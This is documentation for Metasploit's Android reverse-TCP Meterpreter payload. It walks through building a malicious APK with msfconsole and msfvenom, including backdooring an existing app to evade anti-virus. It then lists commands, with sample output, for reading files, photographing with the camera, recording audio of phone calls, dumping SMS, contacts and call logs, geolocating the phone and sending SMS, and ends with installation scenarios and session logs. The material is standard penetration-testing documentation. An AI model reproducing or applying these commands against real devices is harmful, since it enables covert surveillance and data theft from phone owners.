The android/meterpreter/reverse_tcp payload is a Java-based Meterpreter that can be used on an
Android device. It is still at an early stage of development, but there are so many things you can
do with it already.

The Android Meterpreter allows you to do things like take remote control the file system, listen to phone calls, retrieve or send SMS messages, geo-locate the user, run post-exploitation modules, etc.

## Vulnerable Application

You can test android/meterpreter/reverse_tcp on these devices:

**Android Emulator**

An emulator is the most convenient way to test Android Meterpreter. You can try:

* [Android SDK](http://developer.android.com/sdk/index.html#Other) - Creates and manages your emulators from a command prompt or terminal.
* [Android Studio](http://developer.android.com/sdk/installing/index.html?pkg=studio) - Allows you to manage emulators more easily than the SDK.
* [GenyMotion](https://www.genymotion.com/download/) - Requires an account. 
* [AndroidAVDRepo](https://github.com/dral3x/AndroidAVDRepo) - Contains a collection of pre-configured emulators.


**A real Android device**

Having a real Android device allows you to test features or vulnerabilities you don't necessarily
have from an emulator, which might be specific to a manufacturer, carrier, or hardware. You also
get to test it over a real network.


## Verification Steps

Currently, the most common way to use Android Meterpreter is to create it as an APK, and then
execute it.

To create the APK with msfconsole:

```
msf > use payload/android/meterpreter/reverse_tcp 
msf payload(reverse_tcp) > set LHOST 192.168.1.199
LHOST => 192.168.1.199
msf payload(reverse_tcp) > generate -t raw -f /tmp/android.apk
[*] Writing 8992 bytes to /tmp/android.apk...
msf payload(reverse_tcp) >
```

### To create the APK with msfvenom:

```
./msfvenom -p android/meterpreter/reverse_tcp LHOST=[IP] LPORT=4444 -f raw -o /tmp/android.apk
```

### To inject meterpreter into an existing APK with msfvenom:

You can also add Android meterpreter to any existing APK. This will make it harder for
Anti-virus software to detect the payload, and allow you read internal files and take
screenshots of the Android app that you are backdooring:

```
./msfvenom -p android/meterpreter/reverse_tcp -x com.existing.apk LHOST=[IP] LPORT=4444 -f raw -o /tmp/android.apk
```

[Please see here for more documentation on Android injection](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/payload/android/meterpreter/injection.md).


Next, start an Android device. Upload the APK, and execute it. There are different ways to do this,
so please refer to the Scenarios section for more information.

## Important Basic Commands

**pwd**

The ```pwd``` command allows you to see the current directory you're in.

```
meterpreter > pwd
/data/data/com.metasploit.stage
```

**cd**

The ```cd``` command allows you to change directory. For example:

```
meterpreter > cd cache
meterpreter > ls
```

**cat**

The ```cat``` command allows you to see the contents of a file.

**ls**

The ```ls``` command displays items in a directory. For example:

```
meterpreter > ls
Listing: /data/data/com.metasploit.stage/files
==============================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100444/r--r--r--  0     fil   2016-03-08 14:56:08 -0600  rList-com.metasploit.stage.MainActivity
```

**upload**

The ```upload``` command allows you to upload a file to the remote target. The ```-r``` option
allows you to do so recursively.

**download**

The ```download``` command allows you to download a file from the remote target. The ```-r```
option allows you to do so recursively.

**search**

The ```search``` command allows you to find files on the remote target. For example:

```
meterpreter > search -d . -f *.txt
```

**ifconfig**

The ```ifconfig``` command displays the network interfaces on the remote machine.

```
meterpreter > ifconfig

...

Interface 10
============
Name         : wlan0 - wlan0
Hardware MAC : 60:f1:89:07:c2:7e
IPv4 Address : 192.168.1.207
IPv4 Netmask : 255.255.255.0
IPv6 Address : 2602:30a:2c51:e660:62f1:89ff:fe07:c27e
IPv6 Netmask : ::
IPv6 Address : fe80::62f1:89ff:fe07:c27e
IPv6 Netmask : ::
IPv6 Address : 2602:30a:2c51:e660:81ae:6bbd:e0e1:5954
IPv6 Netmask : ::

...
```

**getuid**

The ```getuid``` command shows the current user that the payload is running as:

```
meterpreter > getuid
Server username: u0_a231
```

**ps**

The ```ps``` command shows a list of processes the Android device is running. For example:

```
meterpreter > ps 

Process List
============

 PID    Name                                                         Arch  User
 ---    ----                                                         ----  ----
 1      /init                                                              root
 2      kthreadd                                                           root
 3      ksoftirqd/0                                                        root
 7      migration/0                                                        root
 8      rcu_preempt                                                        root
 9      rcu_bh                                                             root
 10     rcu_sched                                                          root
 11     watchdog/0                                                         root
 12     watchdog/1                                                         root
 13     migration/1                                                        root
 14     ksoftirqd/1                                                        root
 17     watchdog/2                                                         root
 18     migration/2                                                        root
 19     ksoftirqd/2                                                        root
 22     watchdog/3                                                         root
 23     migration/3                                                        root

...
```

**shell**

The ```shell``` command allows you to interact with a shell:

```
meterpreter > shell
Process 1 created.
Channel 1 created.
id
uid=10231(u0_a231) gid=10231(u0_a231) groups=1015(sdcard_rw),1028(sdcard_r),3003(inet),9997(everybody),50231(all_a231) context=u:r:untrusted_app:s0
```

To get back to the Meterpreter prompt, you can do: [CTRL]+[Z]

**sysinfo**

The ```sysinfo``` command shows you basic information about the Android device.

```
meterpreter > sysinfo
Computer    : localhost
OS          : Android 5.1.1 - Linux 3.10.61-6309174 (aarch64)
Meterpreter : java/android
```

**webcam_list**

The ```webcam_list``` command shows a list of webcams you could use for the ```webcam_snap```
command. Example:

```
meterpreter > webcam_list
1: Back Camera
2: Front Camera
```

**webcam_snap**

The ```webcam_snap``` command takes a picture from the device. You will have to use the
```webcam_list``` command to figure out which camera to use. Example:

```
meterpreter > webcam_snap -i 2
[*] Starting...
[+] Got frame
[*] Stopped
Webcam shot saved to: /Users/user/rapid7/msf/uFWJXeQt.jpeg
```

**record_mic**

The ```record_mic``` command records audio. Good for listening to a phone conversation, as well as
other uses. Example:

```
meterpreter > record_mic -d 20
[*] Starting...
[*] Stopped
Audio saved to: /Users/user/rapid7/msf/YAUtubCR.wav
```

**activity_start**

The ```activity_start``` command is an execute command by starting an Android activity from a URI
string.

**check_root**

The ```check_root``` command detects whether your payload is running as root or not. Example:

```
meterpreter > check_root
[*] Device is not rooted
```

**dump_calllog**

The ```dump_calllog``` command retrieves the call log from the Android device.

**dump_contacts**

```
meterpreter > dump_contacts
[*] Fetching 5 contacts into list
[*] Contacts list saved to: contacts_dump_20160308155744.txt
```

**geolocate**

The ```geolocate``` commands allows you to locate the phone by retrieving the current lat-long
using geolocation.

**wlan_geolocate**

The ```wlan_geolocation``` command allows you to locate the phone by retrieving the current
lat-long using WLAN information. Example:

```
meterpreter > wlan_geolocate
[*] Google indicates the device is within 150 meters of 30.*******,-97.*******.
[*] Google Maps URL:  https://maps.google.com/?q=30.*******,-97.*******
```

**send_sms**

The ```send_sms``` command allows you to send an SMS message. Keep in mind the phone will keep a
copy of it, too.

```
meterpreter > send_sms -d "2674554859" -t "hello"
[+] SMS sent - Transmission successful
```

**sms_dump**

The ```sms_dump``` command allows you to retrieve SMS messages. And save them as a text file.
For example:

```
meterpreter > dump_sms
[*] Fetching 4 sms messages
[*] SMS messages saved to: sms_dump_20160308163212.txt

...

$ cat sms_dump_20160308163212.txt

=====================
[+] SMS messages dump
=====================

Date: 2016-03-08 15:30:12 -0600
OS: Android 5.1.1 - Linux 3.10.61-6309174 (aarch64)
Remote IP: 192.168.1.207
Remote Port: 59130

#1
Type	: Incoming
Date	: 2016-03-08 15:29:32
Address	: **********
Status	: NOT_RECEIVED
Message	: Hello world

...

```

**run**

The ```run``` command allows you to run a post module against the remote machine at the Meterpreter
prompt. For example:

```
meterpreter > run post/android/capture/screen 
```

## Scenarios

**Uploading APK to an Emulator using install_msf_apk.sh**

The Metasploit Framework comes with a script that allows you to automatically upload your APK to
an active emulator and execute it. It requires the [Android SDK platform-tools](http://developer.android.com/sdk/installing/index.html) to run, as well as [Java](https://java.com/en/download/).

To use this, follow these steps:

1. Start the Android Emulator
2. Generate the Android payload as an APK.
3. In msfconsole, start a handler for android/meterpreter/reverse_tcp
4. Run the installer script like this from a terminal:

```
$ tools/exploit/install_msf_apk.sh /tmp/android.apk
```

The the script will do something like this:

```
$ tools/exploit/install_msf_apk.sh /tmp/android.apk 
   adding: META-INF/ANDROIDD.SF
   adding: META-INF/ANDROIDD.RSA
  signing: classes.dex
  signing: AndroidManifest.xml
  signing: resources.arsc
Failure
1562 KB/s (10715 bytes in 0.006s)
	pkg: /data/local/tmp/android.apk
Success
rm failed for -f, Read-only file system
Starting: Intent { act=android.intent.action.MAIN cmp=com.metasploit.stage/.MainActivity }
```

Back in msfconsole, you should receive a session:

```
[*] Started reverse TCP handler on 192.168.1.199:4444 
[*] Starting the payload handler...
[*] Sending stage (62432 bytes) to 192.168.1.199
[*] Meterpreter session 1 opened (192.168.1.199:4444 -> 192.168.1.199:49178) at 2016-03-08 13:00:10 -0600

meterpreter > 
```

**Uploading APK to a real Android device using install_msf_apk.sh**

On the Android device, make sure to enable Developer Options. To do this:

1. Go to Settings -> About -> Software Information
2. Tap on the Build Number section a couple of times. It should unlock Developer Options.
3. Go back to the Settings page, you should see Developer Options.

Under Developer Options, make sure to:

* Enable USB debugging
* Disable Verify apps via USB
* Open a terminal, and type: ```adb devices```. On your Android device, you should see a prompt
  asking you to allow the computer for debugging, click OK on that.
* Do: ```adb devices``` again, adb should now have access.

Run the installer script like this from a terminal:

```
$ tools/exploit/install_msf_apk.sh /tmp/android.apk
```

And you should get a session.



**Uploading APK from a Web Server**

One way to upload an APK to Android without adb is by hosting it from a web server. To do this,
you must make sure to allow to trust "Unknown sources". The way to do this varies, but normally
it's something like this: Settings -> Security -> Check "Unknown Sources"

Once you have that changed, you'll need to:

1. Generate the APK payload.
2. Start a web server from the directory where the payload is: ```ruby -run -e httpd . -p 8181```
3. On your Android device, open a browser, and download the APK.
4. You should be able to find the APK from the Downloads folder, install it.
5. After installation, you will have to manually execute it.

**Reconnect Android Meterpreter from the Browser Remotely**

When you have the APK payload installed on your Android device, another trick to reconnect it is to
launch an intent from a browser. An intent is simply a term in Android development that means "an operation to be performed."

Here's how you do this:

1. In msfconsole, start a multi/handler for android/meterpreter/reverse_tcp as a background job.
2. Do: ```auxiliary/server/android_browsable_msf_launch```.
3. Set the URIPATh if needed.
4. Do: ```run```. At this point, the web server should be up.
5. On your Android device, open the native web browser, and go the URL generated by the auxiliary
   module.
6. The Android handler should get a session like the following demo:

```
msf > use exploit/multi/handler 
msf exploit(handler) > set PAYLOAD android/meterpreter/reverse_tcp
PAYLOAD => android/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST 192.168.1.199
LHOST => 192.168.1.199
msf exploit(handler) > set EXITONSESSION false
EXITONSESSION => false
msf exploit(handler) > run -j
[*] Exploit running as background job.

[*] Started reverse TCP handler on 192.168.1.199:4444 
msf exploit(handler) > [*] Starting the payload handler...

msf exploit(handler) > use auxiliary/server/android_browsable_msf_launch
msf auxiliary(android_browsable_msf_launch) > set URIPATH /test
URIPATH => /test
msf auxiliary(android_browsable_msf_launch) > run

[*] Using URL: http://0.0.0.0:8080/test
[*] Local IP: http://192.168.1.199:8080/test
[*] Server started.
[*] Sending HTML...
[*] Sending stage (62432 bytes) to 192.168.1.207
[*] Meterpreter session 1 opened (192.168.1.199:4444 -> 192.168.1.207:47523) at 2016-03-08 15:09:25 -0600
```
